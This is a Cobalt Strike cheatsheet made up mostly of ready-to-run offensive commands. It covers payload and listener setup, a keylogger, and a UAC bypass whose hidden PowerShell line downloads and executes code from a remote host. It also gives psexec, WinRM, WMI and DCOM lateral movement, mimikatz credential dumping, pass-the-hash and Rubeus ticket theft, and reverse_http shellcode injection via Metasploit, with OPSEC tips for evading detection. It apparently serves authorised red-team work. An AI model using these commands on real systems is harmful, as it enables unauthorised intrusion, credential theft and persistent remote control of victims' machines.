# Cobalt-Strike cheatsheet.

#### Start teamserver
```
cd /opt/cobaltstrike
./teamserver <IP> <PASSWORD>
```

#### Create a listener
- Cobalt Strike --> Listeners -->  Click the Add button and a New Listener dialogue will appear.
- Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
- Set the variables and click Save.

#### Create a payload
- OPSEC: Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
- OPSEC: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
- Attacks --> Packages --> Windows Executable (S).

#### Create peer-to-peer listener
- Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.
- Then create payload for the new listener!

#### Connect to beacon
- Works like a bind shell. Most used are SMB or TCP.
- Run the payload on the target
- Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
```
connect <IP> <PORT>
link <IP>
```

#### Upload and download files
```
upload <FILE>
download <FILE>
```

#### Take screenshots
```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

#### Keylogger
```
keylogger
```

#### Execute assembly in memory
```
execute-assembly <PATH TO EXE> -group=system
```

#### Load PowerShell script
```
powershell-import <FILE>
```

#### Execute cmd command
```
run <COMMAND>
```

#### Execute powershell command
```
powershell <COMMAND>
```

#### Create service binary
- Used for privilege escalation with services
- Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
- TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations

#### Connect to beacon
```
connect <IP> <PORT>
```

#### UAC bypass
```
elevate uac-token-duplication tcp-4444-local

runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
connect localhost 4444
```

####  Elevate to system
```
elevate svc-exe
```

## Lateral movement
#### Jump
```
jump [method] [target] [listener]

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

#### Remote-exec
```
remote-exec [method] [target] [command]

    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

#### Using credentials
Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
```credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.

### PowerShell Remoting
#### Getting the architectur
- for winrm or winrm64 with jump
```
remote-exec winrm <HOSTNAME> (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

#### Jump winrm smb beacon
```
jump winrm64 <HOSTNAME> smb
```

### PSexec
```
jump psexec64 <HOSTNAME> smb
```

### WMI
```
cd \\<HOSTNAME>\ADMIN$
upload C:\Payloads\beacon-smb.exe
remote-exec wmi <HOSTNAME> C:\Windows\beacon-smb.exe
```

#### CoInitializeSecurity
- Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.
- if CoInitializeSecurity has already been called, WMI fails with access denied.
- As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.

```
remote-exec wmi srv-2 calc
execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Windows\System32\calc.exe"
```

#### DCOM
- https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
```
powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
```

### Credentias
#### Mimikatz logonpasswords
```
mimikatz sekurlsa::logonpasswords
```

#### Mimikatz ekeys
```
mimikatz sekurlsa::ekeys
```

#### Mimikatz sam
```
mimikatz lsadump::sam
```

#### Make token - runas other user
```
make_token <DOMAIN>\<USER> <PASSWORD>
```

#### rev2self
- Undo the make token
```
rev2self
```

#### Steal token
```
steal_token 3320
````

#### Inject payload into process
```
inject 3320 x64 tcp-4444-local
inject <PID> <ARCH> <BEACON>
```

#### Spawnas
- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
- Must be run from a folder the user has access to.
- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
```
spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
```

#### Pass the hash
```
pth <DOMAIN>\<USER> <NTLM HASH>
```

#### Overpass the hash
- OPSEC: Use AES256 keys
```
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
```

#### Extract tickets
```
execute-assembly Rubeus.exe triage
execute-assembly Rubeus.exe dump /service:<SERVICE> /luid:<LUID> /nowrap
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
steal_token 4872
```

## Session passing
### Cobalt strike --> Metasploit
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 8080
exploit -j
```
- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port to 8080, Set the name to Metasploit and click Save.
```
spawn metasploit
```

### Cobalt strike --> Metasploit shellcode inside process
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin
execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 msf.bin
```

### Metasploit --> Cobalt strike
- Go to Attacks --> Packages --> Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```


